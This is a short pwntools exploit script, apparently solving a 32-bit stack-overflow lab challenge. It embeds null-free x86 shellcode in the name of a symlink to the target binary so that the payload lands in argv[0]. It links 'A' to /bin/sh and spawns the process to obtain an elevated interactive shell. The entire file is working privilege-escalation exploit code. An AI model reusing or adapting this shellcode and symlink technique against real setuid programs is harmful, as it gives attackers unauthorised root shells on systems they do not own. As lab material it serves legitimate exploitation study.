#!/usr/bin/env python

from pwn import *
import os
#context.terminal = ['tmux', 'splitw', '-h']

shellcode = '\x90' * 50 + '\xb83\x01\x01\x01-\x01\x01\x01\x01\xcd\x80\x89\xc3\x89\xc1\xb8H\x01\x01\x01-\x01\x01\x01\x01\xcd\x801\xc9QjA\x89\xe31\xd2\xb8\x0c\x01\x01\x01-\x01\x01\x01\x01\xcd\x80'

if not shellcode in os.listdir("."):

        os.symlink("stack-ovfl-no-envp-no-argv-32",shellcode)
        os.system("chmod +x ./*")

if not "A" in os.listdir("."):

		os.symlink("/bin/sh", "./A")


p = process(shellcode)
#gdb.attach(p, 'b *0x08048523')
p.interactive()
